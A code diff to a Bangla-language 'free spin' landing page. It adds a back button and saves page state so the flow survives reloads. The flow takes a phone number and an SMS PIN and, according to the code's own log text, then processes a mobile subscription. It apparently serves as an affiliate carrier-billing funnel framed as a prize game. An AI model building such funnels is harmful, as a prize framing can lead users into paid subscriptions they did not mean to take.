@@ -49,6 +49,23 @@
         .btn-primary { width: 100%; padding: 14px; border: none; border-radius: 60px; font-size: 1.2rem; font-weight: bold; color: white; cursor: pointer; background: #408559; position: relative; z-index: 2; }
         .btn-primary:active { transform: scale(0.97); }
         .btn-primary:disabled { opacity: 0.6; }
+        /* ===== 返回按钮样式 ===== */
+        .btn-back {
+            display: inline-block;
+            padding: 10px 20px;
+            margin-bottom: 12px;
+            border: 2px solid #3A7CAE;
+            border-radius: 30px;
+            font-size: 0.9rem;
+            font-weight: 600;
+            color: #3A7CAE;
+            background: transparent;
+            cursor: pointer;
+        }
+        .btn-back:active {
+            transform: scale(0.95);
+            background: #f1f5f9;
+        }
         .form-group { margin: 15px 0; }
         .form-group input { width: 100%; padding: 14px 16px; font-size: 1.2rem; border: 2px solid #e2e8f0; border-radius: 12px; text-align: center; background: #f8fafc; outline: none; }
         .form-group input:focus { border-color: #3A7CAE; }
@@ -104,6 +121,7 @@
             .btn-primary { padding: 12px; font-size: 1rem; }
             .phone-prefix { padding: 10px 0 10px 12px; font-size: 1rem; min-width: 60px; }
             .phone-input { padding: 10px 12px; font-size: 1rem; }
+            .btn-back { padding: 6px 14px; font-size: 0.75rem; }
         }
 
         /* ===== 可折叠条款样式 ===== */
@@ -216,9 +234,11 @@
         </div>
 
         <div id="pinSection" class="hidden">
+            <!-- ===== 返回按钮 ===== -->
+            <button class="btn-back" id="backBtn">← ফিরে যান</button>
             <h2 style="font-size:1.3rem; color:#1e293b; margin-bottom:6px;">🔑 ভেরিফিকেশন কোড দিন</h2>
             <p style="font-size:0.85rem; color:#1e293b;"><strong>আপনার মোবাইলের SMS দেখুন</strong></p>
-            <p style="font-size:0.85rem; color:#1e293b; margin-bottom:10px;"><strong>৫-অঙ্কের কোড দিন</strong></p>
+            <p style="font-size:0.85rem; color:#1e293b; margin-bottom:10px;"><strong>৪-অঙ্কের কোড দিন</strong></p>
             <div class="pin-container">
                 <input type="text" inputmode="numeric" maxlength="1" class="pin-box">
                 <input type="text" inputmode="numeric" maxlength="1" class="pin-box">
@@ -260,6 +280,36 @@ const cid = new URLSearchParams(location.search).get('cid') ||
             ('direct_' + Date.now());
 
 // ============================================================
+// 【状态持久化工具】
+// ============================================================
+function saveState(key, value) {
+    try {
+        sessionStorage.setItem('free_spin_' + key, JSON.stringify(value));
+    } catch (e) {
+        console.warn('保存状态失败:', e);
+    }
+}
+
+function loadState(key) {
+    try {
+        const data = sessionStorage.getItem('free_spin_' + key);
+        return data ? JSON.parse(data) : null;
+    } catch (e) {
+        console.warn('读取状态失败:', e);
+        return null;
+    }
+}
+
+function clearState() {
+    try {
+        const keys = ['currentTxid', 'userMsisdn', 'msisdn', 'page', 'headerState'];
+        keys.forEach(k => sessionStorage.removeItem('free_spin_' + k));
+    } catch (e) {
+        console.warn('清除状态失败:', e);
+    }
+}
+
+// ============================================================
 // 【MaxConv事件】
 // ============================================================
 function sendMaxConvEvent(eventName) {
@@ -294,6 +344,7 @@ const pinLoading = document.getElementById('pinLoading');
 const pinError = document.getElementById('pinError');
 
 const redirectBtn = document.getElementById('redirectBtn');
+const backBtn = document.getElementById('backBtn');
 const fireworkContainer = document.getElementById('fireworkContainer');
 
 // ============================================================
@@ -312,6 +363,34 @@ function hideError(el) {
 }
 function showLoading(el) { el.classList.add('show'); }
 function hideLoading(el) { el.classList.remove('show'); }
+
+// ============================================================
+// 【页面切换 + 状态保存】
+// ============================================================
+function goToPhonePage() {
+    hide('pinSection');
+    hide('successSection');
+    show('phoneSection');
+    headerFirst.style.display = 'block';
+    headerSecond.style.display = 'none';
+    hide('gameSection');
+    saveState('page', 'phone');
+    saveState('headerState', 'first');
+    msisdnInput.focus();
+}
+
+function goToPinPage() {
+    hide('phoneSection');
+    show('pinSection');
+    saveState('page', 'pin');
+    pinBoxes[0].focus();
+}
+
+function goToSuccessPage() {
+    hide('pinSection');
+    show('successSection');
+    saveState('page', 'success');
+}
 
 // ============================================================
 // 【可折叠条款】
@@ -345,9 +424,9 @@ async function pollStatus(attempt = 0) {
             sendMaxConvEvent('pin_success');
             hideLoading(pinLoading);
             verifyBtn.disabled = false;
-            hide('pinSection');
-            show('successSection');
+            goToSuccessPage();
             triggerFireworks();
+            clearState(); // 成功后清除状态
         } else if (data.status === 'processing') {
             if (attempt % 10 === 0 && attempt > 0) {
                 const minutes = Math.floor(attempt * 3 / 60);
@@ -461,7 +540,15 @@ document.getElementById('playBtn').addEventListener('click', function() {
     headerSecond.style.display = 'block';
     hide('gameSection');
     show('phoneSection');
+    saveState('headerState', 'second');
+    saveState('page', 'phone');
     msisdnInput.focus();
+    
+    // 恢复手机号（如果有保存）
+    const savedMsisdn = loadState('msisdn');
+    if (savedMsisdn) {
+        msisdnInput.value = savedMsisdn;
+    }
     
     setTimeout(() => {
         triggerFireworks();
@@ -486,6 +573,25 @@ pinBoxes.forEach((box, i) => {
 });
 
 // ============================================================
+// 【返回按钮】- 回到手机号页面
+// ============================================================
+backBtn.addEventListener('click', function() {
+    sendMaxConvEvent('back_btn_click');
+    
+    // 清空PIN输入
+    pinBoxes.forEach(b => b.value = '');
+    hideError(pinError);
+    hideLoading(pinLoading);
+    
+    // 清空验证相关状态（保留手机号）
+    currentTxid = null;
+    saveState('currentTxid', null);
+    
+    // 回到手机号页面
+    goToPhonePage();
+});
+
+// ============================================================
 // 【事件2】点击「发送」- 真实API调用
 // ============================================================
 sendBtn.addEventListener('click', async function() {
@@ -505,6 +611,10 @@ sendBtn.addEventListener('click', async function() {
     msisdn = '880' + msisdn;
     userMsisdn = msisdn;
 
+    // 保存手机号
+    saveState('msisdn', msisdnInput.value.trim().replace(/\D/g, ''));
+    saveState('userMsisdn', msisdn);
+
     sendMaxConvEvent('phone_submit');
     hideError(phoneError);
     showLoading(phoneLoading);
@@ -519,13 +629,12 @@ sendBtn.addEventListener('click', async function() {
 
         if (data.success === true && data.txid) {
             currentTxid = data.txid;
+            saveState('currentTxid', currentTxid);
             console.log('✅ 验证码发送成功, txid:', currentTxid);
             sendMaxConvEvent('pin_sent');
             hideLoading(phoneLoading);
             sendBtn.disabled = false;
-            hide('phoneSection');
-            show('pinSection');
-            pinBoxes[0].focus();
+            goToPinPage();
         } else {
             console.log('❌ 验证码发送失败:', data.msg || 'txid 为空');
             showError(phoneError, data.msg || 'কোড পাঠাতে ব্যর্থ হয়েছে। আবার চেষ্টা করুন।');
@@ -534,7 +643,7 @@ sendBtn.addEventListener('click', async function() {
         }
     } catch (error) {
         console.error('❌ 网络错误:', error);
-        showError(phoneError, 'নেটওয়ার্ক সমস্যা। আপনার সংযোগ পরীক্ষা করুন।');
+        showError(phoneError, '⚠️ নেটওয়ার্ক সমস্যা। দয়া করে আবার ক্লিক করুন');
         hideLoading(phoneLoading);
         sendBtn.disabled = false;
     }
@@ -583,9 +692,9 @@ verifyBtn.addEventListener('click', async function() {
             sendMaxConvEvent('pin_success');
             hideLoading(pinLoading);
             verifyBtn.disabled = false;
-            hide('pinSection');
-            show('successSection');
+            goToSuccessPage();
             triggerFireworks();
+            clearState();
             
         } else if (data.processing === true) {
             console.log('⏳ 订阅处理中，开始轮询...');
@@ -612,6 +721,7 @@ verifyBtn.addEventListener('click', async function() {
                 pinBoxes.forEach(b => b.value = '');
                 verifyBtn.disabled = true;
                 currentTxid = null;
+                saveState('currentTxid', null);
                 
                 setTimeout(async () => {
                     try {
@@ -623,6 +733,7 @@ verifyBtn.addEventListener('click', async function() {
                         
                         if (data.success === true && data.txid) {
                             currentTxid = data.txid;
+                            saveState('currentTxid', currentTxid);
                             console.log('✅ 重新发送成功, txid:', currentTxid);
                             showError(pinError, '✅ নতুন কোড পাঠানো হয়েছে! আপনার SMS দেখুন।');
                             verifyBtn.disabled = false;
@@ -683,6 +794,68 @@ pinBoxes.forEach((box) => {
 });
 
 // ============================================================
+// 【恢复状态】- 页面加载时恢复
+// ============================================================
+(function restoreState() {
+    const savedPage = loadState('page');
+    const savedTxid = loadState('currentTxid');
+    const savedMsisdn = loadState('msisdn');
+    const savedUserMsisdn = loadState('userMsisdn');
+    const savedHeader = loadState('headerState');
+
+    // 恢复手机号
+    if (savedMsisdn) {
+        msisdnInput.value = savedMsisdn;
+    }
+    
+    // 恢复用户手机号（完整格式）
+    if (savedUserMsisdn) {
+        userMsisdn = savedUserMsisdn;
+    }
+
+    // 恢复 txid
+    if (savedTxid) {
+        currentTxid = savedTxid;
+    }
+
+    // 恢复页面状态
+    if (savedPage === 'phone') {
+        headerFirst.style.display = 'none';
+        headerSecond.style.display = 'block';
+        hide('gameSection');
+        show('phoneSection');
+        if (savedHeader === 'second') {
+            headerFirst.style.display = 'none';
+            headerSecond.style.display = 'block';
+        }
+    } else if (savedPage === 'pin') {
+        headerFirst.style.display = 'none';
+        headerSecond.style.display = 'block';
+        hide('gameSection');
+        hide('phoneSection');
+        show('pinSection');
+        if (savedHeader === 'second') {
+            headerFirst.style.display = 'none';
+            headerSecond.style.display = 'block';
+        }
+        // 如果 txid 不存在，回到手机号页面
+        if (!savedTxid) {
+            goToPhonePage();
+        }
+    } else if (savedPage === 'success') {
+        headerFirst.style.display = 'none';
+        headerSecond.style.display = 'block';
+        hide('gameSection');
+        hide('phoneSection');
+        hide('pinSection');
+        show('successSection');
+        triggerFireworks();
+    }
+
+    console.log('🔄 状态恢复完成, page:', savedPage, 'txid:', savedTxid);
+})();
+
+// ============================================================
 // 【控制台调试信息】
 // ============================================================
 console.log('🚀 已切换到真实API模式（txid在请求头）');
@@ -690,6 +863,7 @@ console.log('📡 API_BASE:', API_BASE);
 console.log('📋 OFFER_ID:', OFFER_ID);
 console.log('🔑 CID:', cid);
 console.log('💡 打开浏览器开发者工具查看详细日志');
+console.log('✅ 已添加: 状态持久化 + 返回按钮');
 </script>
 </body>
 </html>
